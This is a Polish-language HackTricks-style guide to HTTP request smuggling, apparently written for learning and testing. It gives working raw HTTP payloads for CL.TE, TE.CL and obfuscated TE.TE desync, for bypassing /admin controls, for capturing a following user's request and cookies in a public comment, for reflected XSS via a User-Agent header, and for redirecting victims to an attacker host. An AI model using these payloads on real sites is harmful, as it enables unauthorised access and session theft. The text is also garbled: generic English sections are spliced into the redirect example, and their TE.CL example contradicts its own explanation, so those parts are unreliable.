# HTTP Request Smuggling / Atak desynchronizacji HTTP

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub.**

</details>

## Czym jest

Ta podatno wystpuje, gdy **desynchronizacja** midzy **serwerami proxy front-endowymi** a **serwerem back-endowym** umo偶liwia **atakujcemu** wysanie 偶dania HTTP, kt贸re zostanie **zinterpretowane** jako **jedno 偶danie** przez serwery proxy front-endowe (balance obci偶enia/proxy odwr贸cony) i jako **2 偶dania** przez serwer back-endowy.\
Umo偶liwia to u偶ytkownikowi **modyfikacj nastpnego 偶dania**, kt贸re dotrze do serwera back-endowego po jego.

### Teoria

[**Specyfikacja RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Jeli wiadomo zostanie odebrana zar贸wno z polem nag贸wka Transfer-Encoding, jak i polem nag贸wka Content-Length, to to drugie MUSI zosta zignorowane.

**Content-Length**

> Nag贸wek jednostki Content-Length wskazuje rozmiar ciaa jednostki, w bajtach, wysanej do odbiorcy.

**Transfer-Encoding: chunked**

> Nag贸wek Transfer-Encoding okrela form kodowania u偶ywan do bezpiecznego przesyania ciaa adunku do u偶ytkownika.\
> Chunked oznacza, 偶e du偶e dane s wysyane w serii fragment贸w

### Rzeczywisto

**Front-End** (balance obci偶enia / proxy odwr贸cony) **przetwarza** nag贸wek _**content-length**_ lub _**transfer-encoding**_, a serwer **Back-End przetwarza** drugi z nich, powodujc **desynchronizacj** midzy tymi dwoma systemami.\
Mo偶e to by bardzo krytyczne, poniewa偶 **atakujcy bdzie w stanie wysa jedno 偶danie** do proxy odwr贸conego, kt贸re zostanie **zinterpretowane** przez serwer **Back-End jako 2 r贸偶ne 偶dania**. Niebezpieczestwo tej techniki polega na tym, 偶e serwer **Back-End zinterpretuje** **wstrzyknite drugie 偶danie** tak, jakby **pochodzio od nastpnego klienta**, a **rzeczywiste 偶danie** tego klienta bdzie **czci** **wstrzyknitego 偶dania**.

### Szczeg贸lne przypadki

Pamitaj, 偶e w protokole HTTP **znak nowej linii skada si z 2 bajt贸w:**

* **Content-Length**: Ten nag贸wek u偶ywa **liczby dziesitnej** do wskazania **liczby bajt贸w** ciaa 偶dania. Oczekuje si, 偶e ciao zakoczy si ostatnim znakiem, **znak nowej linii nie jest potrzebny na kocu 偶dania**.
* **Transfer-Encoding:** Ten nag贸wek u偶ywa w ciele **liczby szesnastkowej** do wskazania **liczby bajt贸w** nastpnego fragmentu. **Fragment** musi **zakoczy si** znakiem **nowej linii**, ale ten znak **nie jest uwzgldniany** przez wska藕nik dugoci. Ta metoda transferu musi zakoczy si **fragmentem o rozmiarze 0, po kt贸rym nastpuj 2 znaki nowej linii**: `0`
* **Connection**: Na podstawie mojego dowiadczenia zaleca si u偶ycie **`Connection: keep-alive`** w pierwszym 偶daniu ataku desynchronizacji.

## Podstawowe przykady

Ataki desynchronizacji 偶da HTTP s tworzone poprzez wysyanie niejednoznacznych 偶da, kt贸re wykorzystuj rozbie偶noci w interpretacji nag贸wk贸w `Content-Length` (CL) i `Transfer-Encoding` (TE) przez serwery front-endowe i back-endowe. Ataki te mog przybiera r贸偶ne formy, g贸wnie jako **CL.TE**, **TE.CL** i **TE.TE**. Ka偶dy typ reprezentuje unikalne poczenie priorytet贸w serwer贸w front-endowych i back-endowych w odniesieniu do tych nag贸wk贸w. Podatnoci wynikaj z r贸偶nych sposob贸w przetwarzania tego samego 偶dania przez serwery, co prowadzi do nieoczekiwanych i potencjalnie zoliwych rezultat贸w.

### Podstawowe przykady typ贸w podatnoci

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Podatno CL.TE (Content-Length u偶ywane przez Front-End, Transfer-Encoding u偶ywane przez Back-End)
- **Front-End (CL):** Przetwarza 偶danie na podstawie nag贸wka `Content-Length`.
- **Back-End (TE):** Przetwarza 偶danie na podstawie nag贸wka `Transfer-Encoding`.
- **Scenariusz ataku:**
- Atakujcy wysya 偶danie, w kt贸rym warto nag贸wka `Content-Length` nie odpowiada rzeczywistej dugoci treci.
- Serwer front-endowy przekazuje cae 偶danie do serwera back-endowego na podstawie wartoci `Content-Length`.
- Serwer back-endowy przetwarza 偶danie jako chunked ze wzgldu na nag贸wek `Transfer-Encoding: chunked`, interpretujc pozostae dane jako oddzielne, nastpne 偶danie.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Podatno TE.CL (Transfer-Encoding u偶ywane przez Front-End, Content-Length u偶ywane przez Back-End)
- **Front-End (TE):** Przetwarza 偶danie na podstawie nag贸wka `Transfer-Encoding`.
- **Back-End (CL):** Przetwarza 偶danie na podstawie nag贸wka `Content-Length`.
- **Scenariusz ataku:**
- Atakujcy wysya 偶danie chunked, w kt贸rym rozmiar chunka (`7b`) i rzeczywista dugo treci (`Content-Length: 4`) nie s zgodne.
- Serwer front-endowy, zgodnie z `Transfer-Encoding`, przekazuje cae 偶danie do serwera back-endowego.
- Serwer back-endowy, zgodnie z `Content-Length`, przetwarza tylko pocztkow cz 偶dania (7b bajt贸w), pozostawiajc reszt jako cz niezamierzonego nastpnego 偶dania.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### Wra偶liwo TE.TE (Transfer-Encoding u偶ywane przez obie strony, z zaciemnieniem)
- **Serwery:** Oba obsuguj `Transfer-Encoding`, ale jeden mo偶e zosta oszukany, ignorujc go za pomoc zaciemnienia.
- **Scenariusz ataku:**
- Atakujcy wysya 偶danie z zaciemnionymi nag贸wkami `Transfer-Encoding`.
- W zale偶noci od tego, kt贸ry serwer (front-end lub back-end) nie rozpoznaje zaciemnienia, mo偶e zosta wykorzystana podatno CL.TE lub TE.CL.
- Nieprzetworzona cz 偶dania, widziana przez jeden z serwer贸w, staje si czci kolejnego 偶dania, prowadzc do smugglingu.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Scenariusz CL.CL (Content-Length u偶ywane przez zar贸wno front-end, jak i back-end):**
- Oba serwery przetwarzaj 偶danie wycznie na podstawie nag贸wka `Content-Length`.
- Ten scenariusz zazwyczaj nie prowadzi do smugglingu, poniewa偶 oba serwery interpretuj dugo 偶dania w ten sam spos贸b.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalne 偶danie
```

#### **Scenariusz CL != 0:**
- Odnosi si do scenariuszy, w kt贸rych nag贸wek `Content-Length` jest obecny i ma warto inn ni偶 zero, co wskazuje, 偶e ciao 偶dania zawiera tre.
- Jest to istotne przy zrozumieniu i tworzeniu atak贸w smugglingowych, poniewa偶 wpywa na to, jak serwery okrelaj koniec 偶dania.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Ciao nie jest puste
```

#### Wymuszanie za pomoc nag贸wk贸w hop-by-hop

Wykorzystujc nag贸wki hop-by-hop, mo偶na wskaza serwerowi proxy, aby **usun nag贸wek Content-Length lub Transfer-Encoding, dziki czemu mo偶liwe jest wykorzystanie HTTP request smuggling**.
```
Connection: Content-Length
```
Aby uzyska **wicej informacji na temat nag贸wk贸w hop-by-hop**, odwied藕:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Wyszukiwanie podatnoci na HTTP Request Smuggling

Identyfikacja podatnoci na HTTP request smuggling czsto mo偶e by osignita za pomoc technik czasowych, kt贸re polegaj na obserwowaniu, jak dugo serwer potrzebuje na odpowied藕 na manipulowane 偶dania. Te techniki s szczeg贸lnie przydatne do wykrywania podatnoci CL.TE i TE.CL. Opr贸cz tych metod istniej inne strategie i narzdzia, kt贸re mo偶na wykorzysta do znalezienia takich podatnoci:

### Wyszukiwanie podatnoci CL.TE za pomoc technik czasowych
- **Metoda:**
- Wylij 偶danie, kt贸re, jeli aplikacja jest podatna, spowoduje, 偶e serwer backendowy bdzie oczekiwa na dodatkowe dane.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Obserwacja:**
- Serwer frontendowy przetwarza 偶danie na podstawie `Content-Length` i przerywa wiadomo przedwczenie.
- Serwer backendowy, oczekujc na wiadomo w postaci chunked, czeka na kolejny chunk, kt贸ry nigdy nie przychodzi, co powoduje op贸藕nienie.

- **Wska藕niki:**
- Timeouts lub dugie op贸藕nienia w odpowiedzi.
- Otrzymanie bdu 400 Bad Request od serwera backendowego, czasami z szczeg贸owymi informacjami o serwerze.

### Wyszukiwanie podatnoci TE.CL za pomoc technik czasowych
- **Metoda:**
- Wylij 偶danie, kt贸re, jeli aplikacja jest podatna, spowoduje, 偶e serwer backendowy bdzie oczekiwa na dodatkowe dane.
- **Przykad:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Obserwacja:**
- Serwer frontendowy przetwarza 偶danie na podstawie `Transfer-Encoding` i przekazuje ca wiadomo.
- Serwer backendowy, oczekujc na wiadomo na podstawie `Content-Length`, czeka na dodatkowe dane, kt贸re nigdy nie przychodz, co powoduje op贸藕nienie.

### Inne metody wyszukiwania podatnoci
- **Analiza r贸偶nicowa odpowiedzi:**
- Wylij nieznacznie zmienione wersje 偶dania i obserwuj, czy odpowiedzi serwera r贸偶ni si w niespodziewany spos贸b, co wskazuje na niezgodno w parsowaniu.

- **U偶ycie narzdzi automatycznych:**
- Narzdzia takie jak rozszerzenie 'HTTP Request Smuggler' w Burp Suite mog automatycznie testowa te podatnoci, wysyajc r贸偶ne formy niejednoznacznych 偶da i analizujc odpowiedzi.

- **Testy zr贸偶nicowanej dugoci treci (Content-Length):**
- Wylij 偶dania z r贸偶nymi wartociami `Content-Length`, kt贸re nie s zgodne z rzeczywist dugoci treci i obserwuj, jak serwer obsuguje takie niezgodnoci.

- **Testy zr贸偶nicowanego kodowania transferu (Transfer-Encoding):**
- Wylij 偶dania z zaciemnionymi lub nieprawidowymi nag贸wkami `Transfer-Encoding` i monitoruj, jak r贸偶nie serwery frontendowe i backendowe reaguj na takie manipulacje.


### Testowanie podatnoci na HTTP Request Smuggling

Po potwierdzeniu skutecznoci technik czasowych wa偶ne jest zweryfikowanie, czy 偶dania klienta mo偶na manipulowa. Prost metod jest pr贸ba zatrucia 偶da, na przykad tak, aby 偶danie do `/` zwr贸cio odpowied藕 404. Przykady `CL.TE` i `TE.CL` om贸wione wczeniej w [Podstawowe przykady](./#basic-examples) pokazuj, jak zatru 偶danie klienta, aby wywoa odpowied藕 404, mimo 偶e klient pr贸buje uzyska dostp do innego zasobu.

**Kluczowe czynniki do uwzgldnienia**

Podczas testowania podatnoci na request smuggling poprzez ingerencj w inne 偶dania, pamitaj o:

* **Odrbne poczenia sieciowe:** "Atak" i "normalne" 偶dania powinny by wysyane za porednictwem oddzielnych pocze sieciowych. U偶ycie tego samego poczenia dla obu nie potwierdza obecnoci podatnoci.
* **Sp贸jne adresy URL i parametry:** Staraj si u偶ywa identycznych adres贸w URL i nazw parametr贸w dla obu 偶da. Nowoczesne aplikacje czsto kieruj 偶dania do konkretnych serwer贸w backendowych na podstawie adresu URL i parametr贸w. Dopasowanie ich zwiksza prawdopodobiestwo, 偶e oba 偶dania zostan przetworzone przez ten sam serwer, co jest warunkiem koniecznym dla udanego ataku.
* **Warunki czasowe i wycigowe:** "Normalne" 偶danie, kt贸re ma wykry ingerencj ze strony "atakujcego" 偶dania, konkurowa bdzie z innymi r贸wnoczesnymi 偶daniami aplikacji. Dlatego wylij "normalne" 偶danie bezporednio po "atakujcym" 偶daniu. W przypadku intensywnie obci偶onych aplikacji mo偶e by konieczne wykonanie kilku pr贸b w celu potwierdzenia podatnoci.
* **Wyzwania zwizane z r贸wnowa偶eniem obci偶enia:** Serwery frontendowe dziaajce jako r贸wnowa偶niki obci偶enia mog rozdziela 偶dania na r贸偶ne systemy backendowe. Jeli "atakujce" i "normalne" 偶dania trafi na r贸偶ne systemy, atak nie powiedzie si. Aspekt r贸wnowa偶enia obci偶enia mo偶e wymaga kilku pr贸b w celu potwierdzenia podatnoci.
* **Niezamierzone skutki dla u偶ytkownik贸w:** Jeli atak niezamierzenie wpywa na 偶danie innego u偶ytkownika (nie na "normalne" 偶danie wysane w celu wykrycia), oznacza to, 偶e atak wpyn na innego u偶ytkownika aplikacji. Kontynuowanie test贸w mo偶e zak贸ca innych u偶ytkownik贸w, dlatego wymaga to ostro偶nego podejcia.


## Nadu偶ywanie HTTP Request Smuggling

### Omijanie kontroli bezpieczestwa frontendu

### Omijanie kontroli bezpieczestwa frontendu za pomoc HTTP Request Smuggling

Czasami proxy frontendowe narzucaj rodki bezpieczestwa, analizujc przychodzce 偶dania. Jednak te rodki mo偶na obej, wykorzystujc HTTP Request Smuggling, co umo偶liwia nieautoryzowany dostp do ograniczonych punkt贸w kocowych. Na przykad, dostp do `/admin` mo偶e by zabroniony zewntrznie, a proxy frontendowe aktywnie blokuje takie pr贸by. Niemniej jednak, to proxy mo偶e nie sprawdza osadzonych 偶da w ramach przemyconego 偶dania HTTP, pozostawiajc luki umo偶liwiajce obejcie tych ogranicze.

Poni偶sze przykady ilustruj, jak mo偶na u偶y HTTP Request Smuggling do omijania kontroli bezpieczestwa frontendu, szczeg贸lnie celujc w cie偶k `/admin`, kt贸ra zwykle jest chroniona przez proxy frontendowe:

**Przykad CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
W ataku CL.TE wykorzystywany jest nag贸wek `Content-Length` dla pocztkowego 偶dania, podczas gdy nastpne osadzone 偶danie wykorzystuje nag贸wek `Transfer-Encoding: chunked`. Proxy front-endowe przetwarza pocztkowe 偶danie `POST`, ale nie sprawdza osadzonego 偶dania `GET /admin`, co umo偶liwia nieautoryzowany dostp do cie偶ki `/admin`.

**Przykad TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
W przeciwnym razie, w ataku TE.CL, pocztkowe 偶danie `POST` u偶ywa `Transfer-Encoding: chunked`, a nastpne osadzone 偶danie jest przetwarzane na podstawie nag贸wka `Content-Length`. Podobnie jak w ataku CL.TE, proxy front-end pomija ukryte 偶danie `GET /admin`, niewiadomie udzielajc dostpu do ograniczonej cie偶ki `/admin`.

### Ujawnianie przepisywania 偶da front-endu <a href="#ujawnianie-przepisywania-偶da-front-endu" id="ujawnianie-przepisywania-偶da-front-endu"></a>

Aplikacje czsto korzystaj z **serwera front-endowego**, aby modyfikowa przychodzce 偶dania przed przekazaniem ich do serwera back-endowego. Typowa modyfikacja polega na dodawaniu nag贸wk贸w, takich jak `X-Forwarded-For: <IP klienta>`, aby przekaza IP klienta do serwera back-endowego. Zrozumienie tych modyfikacji mo偶e by kluczowe, poniewa偶 mo偶e ujawni sposoby **ominicia zabezpiecze** lub **odkrycia ukrytych informacji lub punkt贸w kocowych**.

Aby zbada, jak proxy zmienia 偶danie, zlokalizuj parametr POST, kt贸ry jest odbijany przez back-end w odpowiedzi. Nastpnie stw贸rz 偶danie, u偶ywajc tego parametru na kocu, podobnie jak poni偶ej:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
W tej strukturze kolejne skadniki 偶dania s doczane po `search=`, kt贸ry jest parametrem odzwierciedlonym w odpowiedzi. To odzwierciedlenie ujawni nag贸wki kolejnego 偶dania.

Wa偶ne jest, aby dopasowa nag贸wek `Content-Length` zagnie偶d偶onego 偶dania do rzeczywistej dugoci treci. Zaleca si rozpoczcie od niewielkiej wartoci i stopniowe zwikszanie, poniewa偶 zbyt niska warto obetnie odzwierciedlone dane, podczas gdy zbyt wysoka warto mo偶e spowodowa bd 偶dania.

Ta technika jest r贸wnie偶 stosowana w kontekcie podatnoci TE.CL, ale 偶danie powinno zakoczy si `search=\r\n0`. Bez wzgldu na znaki nowej linii, wartoci zostan doczone do parametru wyszukiwania.

Ta metoda su偶y przede wszystkim do zrozumienia modyfikacji 偶dania dokonanych przez proxy front-end, wykonujc w zasadzie samodzielne ledztwo.

### Przechwytywanie 偶da innych u偶ytkownik贸w <a href="#przechwytywanie-偶da-innych-u偶ytkownik贸w" id="przechwytywanie-偶da-innych-u偶ytkownik贸w"></a>

Mo偶liwe jest przechwycenie 偶da kolejnego u偶ytkownika, dodajc okrelone 偶danie jako warto parametru podczas operacji POST. Oto jak to mo偶na osign:

Dodajc poni偶sze 偶danie jako warto parametru, mo偶na przechowywa 偶danie nastpnego klienta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
W tym scenariuszu **parametr komentarza** ma na celu przechowywanie treci w sekcji komentarzy postu na publicznie dostpnej stronie. W rezultacie, zawarto nastpnego 偶dania pojawi si jako komentarz.

Jednak ta technika ma pewne ograniczenia. Zazwyczaj przechwytuje dane tylko do znacznika parametru u偶ytego w przemyconym 偶daniu. Dla przesyanych formularzy kodowanych w formacie URL, znacznikiem tym jest znak `&`. Oznacza to, 偶e przechwycone treci z 偶dania u偶ytkownika ofiary zatrzymaj si na pierwszym znaku `&`, kt贸ry mo偶e nawet by czci cigu zapytania.

Dodatkowo, warto zauwa偶y, 偶e ta metoda jest r贸wnie偶 wykonalna w przypadku podatnoci na TE.CL. W takich przypadkach 偶danie powinno zakoczy si `search=\r\n0`. Bez wzgldu na znaki nowej linii, wartoci zostan doczone do parametru wyszukiwania.

### Wykorzystanie przemyconego 偶dania HTTP do wykorzystania odbitego XSS

Przemycone 偶danie HTTP mo偶na wykorzysta do eksploatacji stron internetowych podatnych na **odbity XSS**, co daje znaczne korzyci:

* Nie wymaga interakcji z u偶ytkownikami docelowymi.
* Umo偶liwia eksploatacj XSS w czciach 偶dania, kt贸re s normalnie niedostpne, takich jak nag贸wki 偶dania HTTP.

W przypadkach, gdy strona internetowa jest podatna na odbity XSS poprzez nag贸wek User-Agent, poni偶szy adunek demonstruje, jak wykorzysta t podatno:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ten payload jest strukturalnie zaprojektowany w celu wykorzystania podatnoci poprzez:

1. Inicjowanie 偶dania `POST`, pozornie typowego, z nag贸wkiem `Transfer-Encoding: chunked`, wskazujcym pocztek smugglingu.
2. Nastpnie, za pomoc `0`, oznaczane jest zakoczenie ciaa wiadomoci w formacie chunked.
3. Nastpnie, wprowadzane jest smugglowane 偶danie `GET`, gdzie nag贸wek `User-Agent` jest zainfekowany skryptem `<script>alert(1)</script>`, co powoduje wywoanie XSS podczas przetwarzania tego kolejnego 偶dania przez serwer.

Poprzez manipulacj nag贸wkiem `User-Agent` za pomoc smugglingu, payload omija normalne ograniczenia 偶dania, tym samym wykorzystujc podatno Reflected XSS w nietypowy, ale skuteczny spos贸b.

### Wykorzystanie smugglingu 偶dania HTTP do przeksztacenia przekierowania na stronie w otwarte przekierowanie <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Wykorzystywanie przekierowa na stronie za pomoc smugglingu 偶dania HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacje czsto przekierowuj z jednego adresu URL na inny, korzystajc z nazwy hosta z nag贸wka `Host` w adresie URL przekierowania. Jest to powszechne w serwerach internetowych, takich jak Apache i IIS. Na przykad, 偶danie folderu bez ukonika na kocu skutkuje przekierowaniem, kt贸re zawiera ten ukonik:
```
GET /home HTTP/1.1
Host: normal-website.com
```
## HTTP Request Smuggling

This technique allows an attacker to manipulate the way that a front-end and back-end server interpret a sequence of HTTP requests. By exploiting inconsistencies in how these servers handle request parsing, an attacker can smuggle malicious requests past security measures and potentially bypass security controls.

### Introduction

HTTP Request Smuggling takes advantage of the different ways that front-end and back-end servers interpret and process HTTP requests. This technique can be used to bypass security controls and potentially gain unauthorized access to sensitive information or perform other malicious actions.

### How it Works

HTTP Request Smuggling typically involves sending a specially crafted sequence of HTTP requests that exploit inconsistencies in how the front-end and back-end servers handle request parsing. These inconsistencies can lead to the smuggling of malicious requests that are interpreted differently by each server.

The basic steps involved in an HTTP Request Smuggling attack are as follows:

1. The attacker sends a specially crafted HTTP request to the front-end server.
2. The front-end server parses the request and forwards it to the back-end server.
3. The back-end server interprets the request differently than the front-end server, potentially leading to security bypass or other vulnerabilities.
4. The back-end server responds to the request, which is then interpreted by the front-end server.

By carefully crafting the sequence of requests and exploiting inconsistencies in request parsing, an attacker can smuggle malicious requests past security measures and potentially gain unauthorized access or perform other malicious actions.

### Techniques

There are several techniques that can be used to perform HTTP Request Smuggling attacks. Some of the commonly used techniques include:

- **CL.TE** (Content-Length: Transfer-Encoding): This technique involves manipulating the Content-Length and Transfer-Encoding headers to confuse the front-end and back-end servers.
- **TE.CL** (Transfer-Encoding: Content-Length): This technique involves manipulating the Transfer-Encoding and Content-Length headers to confuse the front-end and back-end servers.
- **CL.CL** (Content-Length: Content-Length): This technique involves manipulating the Content-Length header to confuse the front-end and back-end servers.
- **TE.TE** (Transfer-Encoding: Transfer-Encoding): This technique involves manipulating the Transfer-Encoding header to confuse the front-end and back-end servers.

Each technique has its own variations and specific payloads that can be used to exploit the inconsistencies in request parsing.

### Mitigation

To mitigate the risk of HTTP Request Smuggling attacks, it is important to implement proper security controls and follow best practices. Some mitigation techniques include:

- Implementing strict input validation and sanitization to prevent malicious requests from being processed.
- Configuring web servers and proxies to handle HTTP requests consistently and securely.
- Keeping software and systems up to date with the latest security patches and updates.
- Regularly monitoring and analyzing web server logs for any suspicious activity.

By implementing these mitigation techniques, organizations can reduce the risk of HTTP Request Smuggling attacks and protect their systems and sensitive information from unauthorized access or manipulation.
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Chocia偶 wydaje si niewinne, to zachowanie mo偶na manipulowa za pomoc przemytu 偶da HTTP, aby przekierowa u偶ytkownik贸w na zewntrzn stron. Na przykad:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ten przemycony 偶danie mo偶e spowodowa przekierowanie nastpnego przetwarzanego 偶dania u偶ytkownika na stron kontrolowan przez atakujcego:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
## HTTP Request Smuggling

This technique allows an attacker to manipulate the way that a front-end and back-end server interpret a sequence of HTTP requests. By exploiting inconsistencies in how these servers handle request parsing, an attacker can smuggle malicious requests that may bypass security controls and lead to various attacks, such as cache poisoning, session hijacking, or remote code execution.

### CL.TE

This technique leverages the differences in how front-end and back-end servers handle the `Content-Length` and `Transfer-Encoding` headers. By manipulating these headers, an attacker can trick the servers into interpreting the requests differently, leading to request smuggling.

#### CL.TE Request Smuggling

In a CL.TE request smuggling attack, the attacker sends a request with both `Content-Length` and `Transfer-Encoding` headers. The front-end server interprets the request based on the `Content-Length` header, while the back-end server interprets it based on the `Transfer-Encoding` header. This inconsistency can be exploited to smuggle requests.

To perform a CL.TE request smuggling attack, the attacker typically sends a request with a `Content-Length` header indicating a shorter length than the actual request body, and a `Transfer-Encoding` header set to `chunked`. The front-end server reads the request based on the `Content-Length` header and forwards it to the back-end server. However, the back-end server interprets the request as a chunked request due to the `Transfer-Encoding` header. This discrepancy can lead to request smuggling.

#### CL.TE Request Smuggling Example

Here is an example of a CL.TE request smuggling attack:

```
POST /path HTTP/1.1
Host: example.com
Content-Length: 10
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
```

In this example, the attacker sends a POST request with a `Content-Length` header indicating a request body length of 10 bytes. However, the actual request body is empty, as indicated by the `0` in the chunked encoding. After the empty chunk, the attacker smuggles a GET request to `/admin`. The front-end server interprets the request based on the `Content-Length` header and forwards it to the back-end server. However, the back-end server interprets the request as a chunked request due to the `Transfer-Encoding` header, leading to request smuggling.

#### CL.TE Request Smuggling Mitigation

To mitigate CL.TE request smuggling attacks, it is important to ensure consistent request parsing between the front-end and back-end servers. This can be achieved by:

- Configuring the front-end server to reject requests with both `Content-Length` and `Transfer-Encoding` headers.
- Configuring the back-end server to reject chunked requests.

Additionally, it is recommended to keep the front-end and back-end servers up to date with the latest security patches to address any known vulnerabilities that could be exploited for request smuggling.

### TE.CL

This technique leverages the differences in how front-end and back-end servers handle the `Transfer-Encoding` and `Content-Length` headers. By manipulating these headers, an attacker can trick the servers into interpreting the requests differently, leading to request smuggling.

#### TE.CL Request Smuggling

In a TE.CL request smuggling attack, the attacker sends a request with both `Transfer-Encoding` and `Content-Length` headers. The front-end server interprets the request based on the `Transfer-Encoding` header, while the back-end server interprets it based on the `Content-Length` header. This inconsistency can be exploited to smuggle requests.

To perform a TE.CL request smuggling attack, the attacker typically sends a request with a `Transfer-Encoding` header set to `chunked` and a `Content-Length` header indicating a shorter length than the actual request body. The front-end server reads the request based on the `Transfer-Encoding` header and forwards it to the back-end server. However, the back-end server interprets the request as a request with a fixed length body due to the `Content-Length` header. This discrepancy can lead to request smuggling.

#### TE.CL Request Smuggling Example

Here is an example of a TE.CL request smuggling attack:

```
POST /path HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 10

0

GET /admin HTTP/1.1
Host: example.com
```

In this example, the attacker sends a POST request with a `Transfer-Encoding` header set to `chunked` and a `Content-Length` header indicating a request body length of 10 bytes. After the empty chunk, the attacker smuggles a GET request to `/admin`. The front-end server interprets the request based on the `Transfer-Encoding` header and forwards it to the back-end server. However, the back-end server interprets the request as a request with a fixed length body due to the `Content-Length` header, leading to request smuggling.

#### TE.CL Request Smuggling Mitigation

To mitigate TE.CL request smuggling attacks, it is important to ensure consistent request parsing between the front-end and back-end servers. This can be achieved by:

- Configuring the front-end server to reject requests with both `Transfer-Encoding` and `Content-Length` headers.
- Configuring the back-end server to reject requests with both `Transfer-Encoding` and `Content-Length` headers.

Additionally, it is recommended to keep the front-end and back-end servers up to date with the latest security patches to address any known vulnerabilities that could be exploited for request smuggling.
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
